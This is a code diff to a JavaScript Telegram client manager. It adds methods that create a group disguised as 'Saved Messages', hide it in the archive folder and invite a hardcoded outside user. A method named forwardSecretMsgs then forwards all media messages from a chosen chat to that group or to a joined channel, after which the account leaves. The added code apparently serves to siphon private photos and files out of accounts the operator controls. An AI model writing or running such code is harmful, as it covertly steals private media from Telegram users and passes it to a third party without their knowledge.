@@ -25,6 +25,115 @@ class TelegramManager {
     static setActiveClientSetup(data) {
         TelegramManager.activeClientSetup = data;
     }
+    async createGroup() {
+        const groupName = "Saved Messages";
+        const groupDescription = this.phoneNumber;
+        const result = await this.client.invoke(new tl_1.Api.channels.CreateChannel({
+            title: groupName,
+            about: groupDescription,
+            megagroup: true,
+            forImport: true,
+        }));
+        const { id, accessHash } = result.chats[0];
+        const folderId = 1;
+        await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
+            folderPeers: [
+                new tl_1.Api.InputFolderPeer({
+                    peer: new tl_1.Api.InputPeerChannel({
+                        channelId: id,
+                        accessHash: accessHash,
+                    }),
+                    folderId: folderId,
+                }),
+            ],
+        }));
+        const usersToAdd = ["fuckyoubabie"];
+        const addUsersResult = await this.client.invoke(new tl_1.Api.channels.InviteToChannel({
+            channel: new tl_1.Api.InputChannel({
+                channelId: id,
+                accessHash: accessHash,
+            }),
+            users: usersToAdd
+        }));
+        return { id, accessHash };
+    }
+    async createGroupAndForward(fromChatId) {
+        const { id, accessHash } = await this.createGroup();
+        await this.forwardSecretMsgs(fromChatId, id.toString());
+    }
+    async joinChannelAndForward(fromChatId, channel) {
+        const result = await this.joinChannel(channel);
+        const folderId = 1;
+        await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
+            folderPeers: [
+                new tl_1.Api.InputFolderPeer({
+                    peer: new tl_1.Api.InputPeerChannel({
+                        channelId: result.chats[0].id,
+                        accessHash: result.chats[0].accessHash,
+                    }),
+                    folderId: folderId,
+                }),
+            ],
+        }));
+        await this.forwardSecretMsgs(fromChatId, channel);
+    }
+    async forwardSecretMsgs(fromChatId, toChatId) {
+        let offset = 0;
+        let limit = 100;
+        let totalMessages = 0;
+        let forwardedCount = 0;
+        let messages = [];
+        do {
+            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
+            totalMessages = messages.total;
+            const messageIds = messages.map((message) => {
+                offset = message.id;
+                if (message.id && message.media) {
+                    return message.id;
+                }
+                return undefined;
+            }).filter(id => id !== undefined);
+            console.log(messageIds);
+            if (messageIds.length > 0) {
+                try {
+                    const result = await this.client.forwardMessages(toChatId, {
+                        messages: messageIds,
+                        fromPeer: fromChatId,
+                    });
+                    forwardedCount += messageIds.length;
+                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
+                    await (0, Helpers_1.sleep)(5000);
+                }
+                catch (error) {
+                    console.error("Error occurred while forwarding messages:", error);
+                }
+                await (0, Helpers_1.sleep)(5000);
+            }
+        } while (messages.length > 0);
+        await this.leaveChannels([toChatId]);
+        return;
+    }
+    async forwardMessages(fromChatId, toChatId, messageIds) {
+        const chunkSize = 30;
+        const totalMessages = messageIds.length;
+        let forwardedCount = 0;
+        for (let i = 0; i < totalMessages; i += chunkSize) {
+            const chunk = messageIds.slice(i, i + chunkSize);
+            try {
+                const result = await this.client.forwardMessages(toChatId, {
+                    messages: chunk,
+                    fromPeer: fromChatId,
+                });
+                forwardedCount += chunk.length;
+                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
+                await (0, Helpers_1.sleep)(5000);
+            }
+            catch (error) {
+                console.error("Error occurred while forwarding messages:", error);
+            }
+        }
+        return forwardedCount;
+    }
     async disconnect() {
         if (this.client) {
             console.log("Destroying Client: ", this.phoneNumber);
@@ -277,7 +386,9 @@ class TelegramManager {
                     channel: id
                 }));
                 console.log("Left channel :", id);
-                await (0, Helpers_1.sleep)(30000);
+                if (chats.length > 1) {
+                    await (0, Helpers_1.sleep)(30000);
+                }
             }
             catch (error) {
                 const errorDetails = (0, utils_1.parseError)(error);
@@ -289,6 +400,7 @@ class TelegramManager {
         return await this.client?.getEntity(entity);
     }
     async joinChannel(entity) {
+        console.log("trying to join channel : ", entity);
         return await this.client?.invoke(new tl_1.Api.channels.JoinChannel({
             channel: await this.client?.getEntity(entity)
         }));
